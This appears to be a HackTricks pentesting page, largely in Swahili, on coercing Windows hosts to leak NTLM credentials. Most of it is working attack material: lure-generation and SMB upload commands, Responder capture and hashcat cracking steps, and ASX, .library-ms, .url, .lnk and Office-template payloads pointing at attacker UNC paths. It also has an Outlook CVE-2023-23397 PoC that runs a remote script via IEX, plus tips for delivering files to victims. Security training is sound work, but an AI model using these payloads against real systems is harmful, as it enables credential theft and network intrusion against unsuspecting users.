# Maeneo ya kumuibia NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo yote mazuri kutoka [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) kutoka kwenye kupakua microsoft word file mtandaoni hadi ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md and [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ikiwa unaweza **kuandika kwenye share ambayo watumiaji au kazi zilizopangwa zinapotembelea kupitia Explorer**, weka faili ambazo metadata yake inaonyesha kwenye UNC yako (mfano `\\ATTACKER\share`). Kuonyesha folda husababisha **implicit SMB authentication** na leaks a **NetNTLMv2** kwa listener wako.

1. **Tengeneza lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Weka yao kwenye writable share** (folda yoyote ambayo mwanaathiriwa anafungua):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows inaweza kufikia faili kadhaa kwa wakati mmoja; chochote ambacho Explorer previews (`BROWSE TO FOLDER`) hakihitaji kubofya.

### Windows Media Player playlists (.ASX/.WAX)

Ikiwa unaweza kumfanya lengwa kufungua au preview Windows Media Player playlist unayodhibiti, unaweza leak Net‑NTLMv2 kwa kuelekeza kipengee kwenye UNC path. WMP itajaribu kupakua media iliyorejelewa kupitia SMB na itajitambulisha kwa njia isiyoonekana.

Mfano wa payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Mtiririko wa ukusanyaji na cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms iliyowekwa ndani ya ZIP NTLM leak (CVE-2025-24071/24055)

Windows Explorer inashughulikia .library-ms kwa njia isiyo salama wakati zinapofunguliwa moja kwa moja kutoka ndani ya archive ya ZIP. Ikiwa ufafanuzi wa maktaba unaonyesha kwenye njia ya UNC ya mbali (mfano, \\attacker\share), kuvinjari/kuanzisha .library-ms ndani ya ZIP tu husababisha Explorer kuorodhesha UNC na kutuma uthibitisho wa NTLM kwa mshambuliaji. Hii inatoa NetNTLMv2 ambayo inaweza kuvunjwa offline au, kwa uwezekano, relayed.

Minimal .library-ms inayoelekeza kwenye UNC ya mshambuliaji
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Unda faili .library-ms kwa kutumia XML hapo juu (weka IP/hostname yako).
- Weka kwenye ZIP (katika Windows: Send to → Compressed (zipped) folder) na uwasilishe ZIP kwa lengo.
- Anzisha NTLM capture listener na usubiri mhasiriwa afungue .library-ms kutoka ndani ya ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows ilichakata property ya MAPI iliyopanuliwa PidLidReminderFileParameter katika vitu vya kalenda. Ikiwa property hiyo inaonyesha kwenye njia ya UNC (mfano, \\attacker\share\alert.wav), Outlook ingewasiliana na SMB share wakati kikumbusho kinapowaka, ikimtolea leak ya Net‑NTLMv2 ya mtumiaji bila bonyeza lolote. Hii ilirekebishwa tarehe 14 Machi 2023, lakini bado inahusiana sana kwa fleets za zamani/zisizoguswa na kwa majibu ya matukio ya kihistoria.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Upande wa Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Vidokezo
- Mwanaathiriwa anahitaji tu Outlook for Windows kuwa inayoendesha wakati ukumbusho unapoanzishwa.
- Leak hutoa Net‑NTLMv2 inayofaa kwa offline cracking au relay (si pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer huonyesha icons za shortcut moja kwa moja. Utafiti wa hivi karibuni ulionyesha kwamba hata baada ya patch ya Microsoft ya Aprili 2025 kwa UNC‑icon shortcuts, bado ilikuwa inawezekana kusababisha NTLM authentication bila kubofya kwa kuweka target ya shortcut kwenye UNC path na kuweka icon kuwa local (patch bypass assigned CVE‑2025‑50154). Kuangalia tu folder kunasababisha Explorer kuchukua metadata kutoka kwa remote target, ikituma NTLM kwa attacker SMB server.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload ya mfupisho wa programu (.lnk) kupitia PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Mawazo ya utoaji
- Weka shortcut ndani ya ZIP na mfanye mwathiriwa aivinjari.
- Weka shortcut kwenye writable share ambayo mwathiriwa atafungua.
- Changanya na lure files zingine katika folder ile ile ili Explorer i-preview items.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents zinaweza kurejea external template. Ikiwa utaweka attached template kwa UNC path, kufungua document kuta-authenticate kwa SMB.

Minimal DOCX relationship changes (inside word/):

1) Hariri word/settings.xml na ongeza the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Hariri word/_rels/settings.xml.rels na uelekeze rId1337 kwenye UNC yako:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Repack to .docx and deliver. Endesha SMB capture listener yako na usubiri kufunguliwa.

Kwa mawazo ya baada ya capture kuhusu relaying au abusing NTLM, angalia:

{{#ref}}
README.md
{{#endref}}


## Marejeo
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
